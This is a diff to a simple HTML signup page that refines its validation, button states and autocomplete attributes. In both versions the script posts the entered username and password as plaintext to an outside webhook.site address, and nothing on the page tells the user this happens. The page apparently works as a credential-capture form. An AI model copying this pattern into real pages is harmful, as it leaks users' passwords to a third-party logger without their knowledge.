@@ -74,6 +74,10 @@
       cursor: pointer;
       transition: background-color 0.3s ease;
     }
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
     button:hover {
       background-color: #0f786f;
     }
@@ -95,53 +99,68 @@
     <h2>Signup</h2>
     <div class="input-group">
       <label for="username">Username</label>
-      <input type="text" id="username" placeholder="Choose a username">
+      <input type="text" id="username" placeholder="Choose a username" autocomplete="username">
     </div>
     <div class="input-group">
       <label for="password">Password</label>
-      <input type="password" id="password" placeholder="Choose a password">
+      <input type="password" id="password" placeholder="Choose a password" autocomplete="new-password">
     </div>
-    <button onclick="signup()">Signup</button>
+    <button id="signupBtn" onclick="signup()">Signup</button>
     <div class="message" id="message"></div>
   </div>
 
-<script>
-  function signup() {
-    const user = document.getElementById("username").value;
-    const pass = document.getElementById("password").value;
-    const message = document.getElementById("message");
+  <script>
+    function signup() {
+      const user = document.getElementById("username").value.trim();
+      const pass = document.getElementById("password").value.trim();
+      const message = document.getElementById("message");
+      const btn = document.getElementById("signupBtn");
 
-    if (user && pass) {
-      message.style.color = "lightgreen";
-      message.textContent = "Signup successful!";
-    } else {
-      message.style.color = "salmon";
-      message.textContent = "Please fill in both fields.";
-      return;
-    }
+      // Clear any previous messages
+      message.textContent = "";
+      message.style.color = "#fff";
 
-    console.log("Sending to webhook:", user, pass); // Debug log
+      // Basic validation
+      if (!user || !pass) {
+        message.style.color = "salmon";
+        message.textContent = "Please fill in both fields.";
+        return;
+      }
 
-    const webhookURL = "https://webhook.site/11f12cc1-f07d-4d4a-89f2-85063aa15916";
+      // Optional: stronger password or username checks
+      if (user.includes(" ") || pass.includes(" ")) {
+        message.style.color = "salmon";
+        message.textContent = "No spaces allowed in username or password.";
+        return;
+      }
 
-    fetch(webhookURL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        username: user,
-        password: pass
+      btn.disabled = true; // Disable to prevent multiple clicks
+
+      const webhookURL = "https://webhook.site/11f12cc1-f07d-4d4a-89f2-85063aa15916";
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: user, password: pass })
       })
-    }).then(response => {
-      console.log("Webhook response:", response);
-    }).catch(error => {
-      console.error("Error sending to webhook:", error);
-      message.style.color = "salmon";
-      message.textContent = "Failed to send data to webhook.";
-    });
-  }
-</script>
+      .then(response => {
+        if (response.ok) {
+          message.style.color = "lightgreen";
+          message.textContent = "Signup successful!";
+        } else {
+          throw new Error("Server returned an error");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        message.style.color = "salmon";
+        message.textContent = "Error sending data to webhook.";
+      })
+      .finally(() => {
+        btn.disabled = false; // Re-enable button
+      });
+    }
+  </script>
 
 </body>
 </html>
